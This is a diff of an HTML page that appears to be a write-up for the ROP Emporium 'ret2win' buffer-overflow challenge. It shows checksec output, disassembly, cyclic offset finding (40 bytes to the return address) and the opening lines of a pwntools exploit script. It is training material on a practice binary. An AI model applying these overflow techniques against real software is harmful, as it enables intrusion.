@@ -9,7 +9,7 @@ ropper<span style=color:#f92672>/</span>ROPgadget
 radare2
 vim<span style=color:#f92672>/</span>emacs<span style=color:#f92672>-</span>doom<span style=color:#f92672>/</span>sublime(favorite<span style=color:#f92672>-</span>text<span style=color:#f92672>-</span>editors)
 </code></pre></div><p>The binary and challenge description can be found here
-<a href=https://ropemporium.com/challenge/ret2win.html>ret2win</a></p><p>Lets run the binary and see what happens!</p><pre><code class=language-terminal data-lang=terminal>ret2win64 ➤ ./ret2win
+<a href=https://ropemporium.com/challenge/ret2win.html>ret2win</a></p><p>Lets run the binary and see what happens!</p><pre tabindex=0><code class=language-terminal data-lang=terminal>ret2win64 ➤ ./ret2win
 ret2win by ROP Emporium
 x86_64
 
@@ -22,7 +22,7 @@ Thank you!
 
 Exiting
 ret2win64 ➤
-</code></pre><h2 id=mitigations-in-binaries>Mitigations in binaries<a href=#mitigations-in-binaries class=hanchor arialabel=Anchor>&#8983;</a></h2><p>let&rsquo;s checkout the binary mitigations first</p><pre><code class=language-terminal data-lang=terminal>ret2win64 ➤ checksec ret2win
+</code></pre><h2 id=mitigations-in-binaries>Mitigations in binaries<a href=#mitigations-in-binaries class=hanchor arialabel=Anchor>&#8983;</a></h2><p>let&rsquo;s checkout the binary mitigations first</p><pre tabindex=0><code class=language-terminal data-lang=terminal>ret2win64 ➤ checksec ret2win
 [*] '/home/h4x5p4c3/Documents/pwn/rop_emporium/0-ret2win/ret2win64/ret2win'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -103,7 +103,7 @@ we know the pwnme function contains the vulnerable gets fucntions which we need 
 │           0x0040076f      5d             pop rbp
 └           0x00400770      c3             ret
 <span style=color:#f92672>[</span>0x00400756<span style=color:#f92672>]</span>&gt;
-</code></pre></div><p>Its prints the flag this is the exact thing we wanted to do!</p><p>Now lets find the offset that&rsquo;ll be needed to overwrite the instruction pointer</p><p>for the pattern value we&rsquo;ll use cyclic from pwntools to find the offset</p><pre><code class=language-terminal data-lang=terminal>ret2win64 ➤ cyclic  60
+</code></pre></div><p>Its prints the flag this is the exact thing we wanted to do!</p><p>Now lets find the offset that&rsquo;ll be needed to overwrite the instruction pointer</p><p>for the pattern value we&rsquo;ll use cyclic from pwntools to find the offset</p><pre tabindex=0><code class=language-terminal data-lang=terminal>ret2win64 ➤ cyclic  60
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
 ret2win64 ➤ ./ret2win
 ret2win by ROP Emporium
@@ -190,7 +190,7 @@ pwndbg&gt; q
 
 In <span style=color:#f92672>[</span>2<span style=color:#f92672>]</span>: cyclic_find<span style=color:#f92672>(</span>0x6161616b<span style=color:#f92672>)</span>
 Out<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span>: <span style=color:#ae81ff>40</span>
-</code></pre></div><p>Now we know the offset is 40 let&rsquo;s craft our exploit but we notice there&rsquo;s actually a hint give the webpage saying</p><pre><code>It's worth confirming this before each challenge but typically you'll need 40 bytes of garbage to reach the saved return address in the 64bit binaries, 44 bytes in the 32bit binaries
+</code></pre></div><p>Now we know the offset is 40 let&rsquo;s craft our exploit but we notice there&rsquo;s actually a hint give the webpage saying</p><pre tabindex=0><code>It's worth confirming this before each challenge but typically you'll need 40 bytes of garbage to reach the saved return address in the 64bit binaries, 44 bytes in the 32bit binaries
 </code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3 </span>
 <span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
 context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;alacritty&#39;</span>, <span style=color:#e6db74>&#39;-e&#39;</span>, <span style=color:#e6db74>&#39;sh&#39;</span>, <span style=color:#e6db74>&#39;-c&#39;</span>]
